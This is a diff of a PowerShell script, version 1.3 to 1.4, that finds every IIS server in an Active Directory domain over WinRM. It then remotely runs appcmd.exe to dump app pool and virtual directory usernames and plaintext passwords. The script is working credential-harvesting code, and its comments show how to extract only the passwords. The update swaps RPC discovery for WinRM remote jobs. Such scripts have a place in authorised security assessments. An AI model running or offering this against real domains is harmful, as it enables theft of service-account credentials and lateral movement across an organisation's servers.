@@ -1,169 +1,22 @@
 ﻿# Get IIS credentials by mapping IIS Servers and getting IIS appPools, vDirectories, usernames & passwords
-# Version: 1.3
 # Comments to yossis@protonmail.com
+# Version: 1.4
+# v1.4 - Better discovery of IIS Servers (srv 2012+) via WinRM instead of RPC - removed function to query w3svc status via RPC (Test-W3SVCAsync)
 
-<# the basic, straight-forward command to retrieve creds locally on an IIS Server
+<# TL'DR - automation of the 'straight-forward command' to retrieve creds locally on an IIS Server
 c:\Windows\system32\inetsrv\appcmd.exe list apppool /text:*
 c:\Windows\system32\inetsrv\appcmd.exe list vdir /text:*
 #>
 
 [cmdletbinding()]
 param(
-    [string]$OutputFolder = "c:\temp"
+    [string]$OutputFolder = "$((Get-Location).path)"
 )
 
 # Set window title
 $host.UI.RawUI.WindowTitle = "IIS Credentials Mapping";
 
-# Set function to find IIS servers by querying w3svc service
-function global:Test-W3SVCAsync
-{    
-    <#
-    .Synopsis
-       Query a list of servers in batches while looking for the world wide web service (w3svc)
-    .PARAMETER MaxConcurrent
-       Specifies the maximum number of servers/commands to run at a time
-    #>
-
-    [CmdletBinding(DefaultParameterSetName='Default')]
-    param(
-        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
-        [ValidateNotNullOrEmpty()] 
-        [string[]] ${Name},
-
-        [ValidateRange(1, 60)]
-        [System.Int32]
-        ${Delay},
-
-        [ValidateScript({$_ -ge 1})]
-        [System.UInt32]
-        $MaxConcurrent = 20,
-
-        [Parameter(ParameterSetName='Quiet')]
-        [Switch]
-        $Quiet
-    )
-
-    begin
-    {
-        if ($null -ne ${function:Get-CallerPreference})
-        {
-            Get-CallerPreference -Cmdlet $PSCmdlet -SessionState $ExecutionContext.SessionState
-        }
-
-        $null = $PSBoundParameters.Remove('MaxConcurrent')
-        $null = $PSBoundParameters.Remove('Quiet')
-        
-        $jobs = @{}
-        $i = -1
-
-        function ProcessCompletedJob
-        {
-            [CmdletBinding()]
-            param (
-                [Parameter(Mandatory = $true)]
-                [hashtable]
-                $Jobs,
-
-                [Parameter(Mandatory = $true)]
-                [int]
-                $Index,
-
-                [switch]
-                $Quiet
-            )
-            
-            $quietStatus = New-Object psobject -Property @{Name = $Jobs[$Index].Target; Success = $false}
-            if ($Jobs[$Index].Job.HasMoreData)
-            {
-                foreach ($result in (Receive-Job $Jobs[$Index].Job))
-                {
-                    if ($Quiet)
-                    {
-                        $quietStatus.Success = $result
-                        break
-                    }
-                            
-                    else
-                    {
-                        Write-Output $result
-                    }
-                }
-            }
-
-            if ($Quiet)
-            {
-                Write-Output $quietStatus
-            }
-
-            Remove-Job -Job $Jobs[$Index].Job -Force
-            $Jobs[$Index] = $null
-
-        } # function ProcessCompletedJob
-
-    } # begin
-
-    process
-    {
-        $null = $PSBoundParameters.Remove('Name')
-        foreach ($target in $Name)
-        {
-            while ($true)
-            {
-                if (++$i -eq $MaxConcurrent)
-                {
-                    Start-Sleep -Milliseconds 100
-                    $i = 0
-                }
-
-                if ($null -ne $jobs[$i] -and $jobs[$i].Job.JobStateInfo.State -ne [System.Management.Automation.JobState]::Running)
-                {
-                    ProcessCompletedJob -Jobs $jobs -Index $i -Quiet:$Quiet
-                }
-                
-                if ($null -eq $jobs[$i])
-                {
-                    Write-Verbose "Job ${i}: Testing ${target}."
-
-                    $job = Start-Job -ScriptBlock {(Get-Service -ComputerName $args[0] -ServiceName "W3SVC" -ErrorAction SilentlyContinue) -ne $null} -ArgumentList $target #@PSBoundParameters
-                    $jobs[$i] = New-Object psobject -Property @{Target = $target; Job = $job}
-
-                    break
-                }
-            }
-        }
-    }
-
-    end
-    {
-        while ($true)
-        {
-            $foundActive = $false
-            for ($i = 0; $i -lt $MaxConcurrent; $i++)
-            {
-                if ($null -ne $jobs[$i])
-                {
-                    if ($jobs[$i].Job.JobStateInfo.State -ne [System.Management.Automation.JobState]::Running)
-                    {
-                        ProcessCompletedJob -Jobs $jobs -Index $i -Quiet:$Quiet
-                    }                    
-                    else
-                    {
-                        $foundActive = $true
-                    }
-                }
-            }
-
-            if (-not $foundActive)
-            {
-                break
-            }
-
-            Start-Sleep -Milliseconds 100
-        }
-    }
-
-} # End function Test-W3SVCAsync
+# <Function Test-W3SVCAsync to find IIS servers via RPC was deducted>
 
 # Set function to ping multiple hosts quickly, async
 function Invoke-PortPing {
@@ -184,7 +37,7 @@ $ds.PropertiesToLoad.Add("operatingsystem") | Out-Null;
 $ds.PropertiesToLoad.Add("name") | Out-Null;
 $Servers = $ds.FindAll().Properties.name;
 
-# ALTERNATIVE using ActiveDirectory module
+# Note: ALTERNATIVE using ActiveDirectory module
 <#
 $Computers = Get-ADComputer -Filter * -Properties pwdlastset, operatingsystem,operatingsystemversion | select name, enabled, operatingsystem,operatingsystemversion , @{n='PasswordLastSet';e={[datetime]::FromFileTime($_.pwdLastSet)}}
 $Servers = ($Computers | where {$_.operatingsystem -like "*SERVER*" -and $_.enabled -eq "True"}).name
@@ -196,17 +49,16 @@ $Servers = ($Computers | where {$_.operatingsystem -like "*SERVER*" -and $_.enab
 
 Write-Output "[x] Checking $($Servers.Count) Servers in the domain...";
 
-# First, check connectivity (Servers are online) through port ping to RPC
-# Assuming RPC is open as default port in Domain environment, and also needed later for Test-W3SVCAsync 
-[int]$Port = 135; # RPC endpoint mapper
-[int]$Timeout = 250; # set timeout in milliseconds. normally 100ms should be fine, taking extra response time here.
+# First, check connectivity (Servers are online) through port ping to WinRM
+[int]$Port = 5985; # RPC endpoint mapper
+[int]$Timeout = 200; # set timeout in milliseconds. normally 100ms should be fine, taking extra response time here.
 [int]$i = 1;
 [int]$HostCount = $Servers.count;
 $ServersPostPing = New-Object System.Collections.ArrayList;
 
 $Servers | ForEach-Object {
         $Computer = $_;
-        Write-Progress -Activity "Testing for RPC connectivity. If IIS Servers are found, Credentials mapping will process. Please wait..." -status "host $i of $HostCount" -percentComplete ($i / $HostCount*100);
+        Write-Progress -Activity "Testing for WinRM connectivity. If IIS Servers are found, Credentials mapping will process. Please wait..." -status "host $i of $HostCount" -percentComplete ($i / $HostCount*100);
         
         if ((Invoke-PortPing -ComputerName $Computer -Port $port -Timeout $timeout -ErrorAction silentlycontinue) -eq "True") {$null = $ServersPostPing.Add($Computer)}
         $i++;
@@ -214,9 +66,14 @@ $Servers | ForEach-Object {
     
 Write-Output "`n`n`n[x] $($ServersPostPing.Count) Servers responded to connectivity check.";
 
-# check for IIS Service async
-$CheckedServers = Test-W3SVCAsync -Name $ServersPostPing -MaxConcurrent 10 -Quiet;
-$IISServers = $CheckedServers | where Success -eq "True" | select -ExpandProperty name;
+# Check for IIS Service that is running
+Get-Job | Remove-Job # -Force
+$null = Invoke-Command -Computername $ServersPostPing -JobName GetW3svcStatus -ScriptBlock {if ($((Get-Service w3svc -ErrorAction SilentlyContinue).Status -eq 'Running')) {return $true} else {return $false}} -AsJob
+
+# wait for remote winRM jobs on IIS Servers to terminate
+$null = Get-Job -Name GetW3svcStatus | Wait-Job;
+$CompletedChildJobs = Get-Job -Name GetW3svcStatus -IncludeChildJob | Where-Object {$_.name -ne "GetW3svcStatus" -and $_.State -eq "completed"}
+$IISServers = $CompletedChildJobs | foreach { if ($($_ | Receive-Job -Keep) -eq "True") {$_.location}}
 
 # Check if any IIS Servers were found
 if (!$IISServers) {
@@ -235,7 +92,7 @@ Get-Job | Remove-Job # -Force
 $null = Invoke-Command -Computername $IISServers -JobName APPPOOL -ScriptBlock {cd $env:windir\system32\inetsrv; "SERVERNAME:$ENV:COMPUTERNAME"; .\appcmd.exe list apppool /text:* } -AsJob
 $null = Invoke-Command -Computername $IISServers -JobName VDIR -ScriptBlock {cd $env:windir\system32\inetsrv; "SERVERNAME:$ENV:COMPUTERNAME"; .\appcmd.exe list vdir /text:* } -AsJob
 
-# Side note: get only user name or only password
+# Additional Note: to get only user name or only password
 # .\Appcmd.exe list apppool /text:processmodel.username
 # .\Appcmd list apppool /text:processmodel.password
 
